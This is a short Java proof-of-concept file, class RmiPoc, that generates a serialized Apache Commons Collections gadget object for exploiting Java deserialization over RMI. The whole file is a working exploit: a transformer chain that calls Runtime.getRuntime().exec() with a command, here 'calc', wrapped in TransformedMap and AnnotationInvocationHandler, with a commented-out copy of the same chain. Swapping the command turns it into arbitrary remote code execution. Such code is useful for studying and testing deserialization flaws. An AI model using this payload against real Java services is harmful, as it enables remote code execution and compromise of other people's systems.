package com.test.poc;

/**
 * The tool class to generate serialized objects
 *
 **/


import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;


public class RmiPoc {
	
	public static Object generator() throws Exception{
		
		String cmd="calc";
		Transformer[] transformers = new Transformer[] {
		        new ConstantTransformer(Runtime.class),
		        new InvokerTransformer("getMethod",                  
		        		new Class[] {String.class, Class[].class },  
		        		new Object[] {"getRuntime", new Class[0] }),
		        new InvokerTransformer("invoke", 
		        		new Class[] {Object.class, Object[].class }, 
		        		new Object[] {null, new Object[0] }),
		        new InvokerTransformer("exec",
		        		new Class[] {String.class },
		        		new Object[] {cmd})
	 		};
		
		Transformer transformerChain = new ChainedTransformer(transformers);
		
		Map innerMap = new HashMap();
		innerMap.put("value","hhhhh"); //The map's key must be "value",don't ask me why, I also want to know why. 
				
		Map outmap = TransformedMap.decorate(innerMap, null, transformerChain);
		Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
				
		Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
		return instance;
		

	   /* Map innerMap = new HashMap();
	    innerMap.put("value", "value");
	  
	    Map outmap = TransformedMap.decorate(innerMap, null, transformerChain);
	    Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
	    
	    Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
	    ctor.setAccessible(true);
	    Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
	    return instance;*/
		
		
	}

}
